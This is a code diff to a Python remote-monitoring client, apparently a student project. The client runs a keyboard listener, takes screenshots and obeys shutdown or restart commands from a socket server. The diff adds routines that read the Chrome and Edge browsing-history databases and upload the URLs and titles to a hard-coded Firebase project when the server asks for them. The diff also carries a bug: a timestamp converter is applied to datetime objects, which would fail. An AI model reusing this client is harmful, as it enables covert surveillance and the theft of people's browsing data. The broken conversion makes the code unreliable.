@@ -3,7 +3,7 @@ import threading
 from pynput.keyboard import Listener
 import socket
 import pyautogui
-from datetime import datetime
+from datetime import datetime, timedelta
 import time
 import os
 import psutil
@@ -15,7 +15,7 @@ firebase_admin.initialize_app(cred, {
     "storageBucket": "pbl4-09092003.appspot.com",
     "databaseURL": "https://pbl4-09092003-default-rtdb.firebaseio.com"
     })
-ref = db.reference('app_history')
+ref = db.reference('history')
 
 
 clientSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -29,6 +29,11 @@ except Exception as e:
     print("Error connecting to server:", str(e))
 if clientSocket:
     print("connecting to server")
+
+def convert_time(timestamp):
+    epoch_start = datetime(1601, 1, 1)
+    dt_object = epoch_start + timedelta(microseconds=timestamp)
+    return dt_object.strftime("%Y-%m-%d %H:%M:%S")
 
 def on_press(key):
     try:
@@ -65,8 +70,6 @@ def takeScreenshot():
         print("Link: ",  link)
         clientSocket.send(link.encode('utf-8'))
         
-
-
     except Exception as e:
         print("Error: " + str(e))
 
@@ -93,8 +96,8 @@ def getAppHistory():
                 start_time_datetime = datetime.fromtimestamp(start_time)
                 close_time_datetime = datetime.fromtimestamp(close_time)
                 
-                formatted_start_time = start_time_datetime.strftime('%H:%M:%S')
-                formatted_close_time = close_time_datetime.strftime('%H:%M:%S')
+                formatted_start_time = convert_time(start_time_datetime)
+                formatted_close_time = convert_time(close_time_datetime)
                 
                 usage_time = close_time - start_time
                 print(f"Closed App: {app}, Usage Time: {usage_time} seconds")
@@ -125,6 +128,66 @@ def getAppHistory():
         
         # Chờ 1 giây trước khi lặp lại để tránh tải nhiều tài nguyên hệ thống
         time.sleep(1)
+
+def push_to_firebase(history_data, browser_type):
+    # Lấy ngày hiện tại
+    current_date = datetime.now().strftime("%Y-%m-%d")
+    
+    # Tham chiếu đến thư mục theo ngày trong Firebase
+    date_ref = ref.child(current_date)
+
+    # Tham chiếu đến thư mục của trình duyệt
+    browser_ref = date_ref.child(f"{browser_type}History")
+    
+    # Đẩy dữ liệu lịch sử duyệt web lên Firebase
+    browser_ref.set(history_data)
+
+
+def get_Edge_history():        
+    db_path = os.path.expanduser('~') + "\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\History"
+
+    connection = sqlite3.connect(db_path)
+    cursor = connection.cursor()
+
+    cursor.execute("SELECT url, title, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 10")
+    results = cursor.fetchall()
+
+    browsing_history = []
+    for row in results:
+        url, title, last_visit_time = row
+        formatted_time = convert_time(last_visit_time)
+        browsing_history.append({"Time": formatted_time, "title": title, "url": url})
+        print(f"{formatted_time}: {title} - {url}")
+
+
+    cursor.close()
+    connection.close()
+
+    # Đẩy dữ liệu lịch sử duyệt web Edge lên Firebase
+    push_to_firebase(browsing_history, "Edge")
+
+def get_Chrome_history():        
+    db_path = os.path.expanduser('~') + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\History"
+
+    connection = sqlite3.connect(db_path)
+    cursor = connection.cursor()
+
+    cursor.execute("SELECT url, title, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 10")
+    results = cursor.fetchall()
+
+    browsing_history = []
+    for row in results:
+        url, title, last_visit_time = row
+        formatted_time = convert_time(last_visit_time)
+        browsing_history.append({"Time": formatted_time, "title": title, "url": url})
+        print(f"{formatted_time}: {title} - {url}")
+
+
+    cursor.close()
+    connection.close()
+
+    # Đẩy dữ liệu lịch sử duyệt web Chrome lên Firebase
+    push_to_firebase(browsing_history, "Chrome")
            
 with Listener(on_press=on_press) as parent:
     try:
@@ -135,10 +198,10 @@ with Listener(on_press=on_press) as parent:
             print("Message:" + message)
             if message == 'takeScreenshot':
                 takeScreenshot()
-            # elif message == 'appHistory':
-                # getAppHistory()
-            # elif message == 'webHistory':
-                # get_edge_history()    
+            elif message == 'ChromeHistory':
+                get_Chrome_history()
+            elif message == 'EdgeHistory':
+                get_Edge_history()
             elif message == 'shutdown':
                 os.system("shutdown /s /t 1")
             elif message == 'restart':
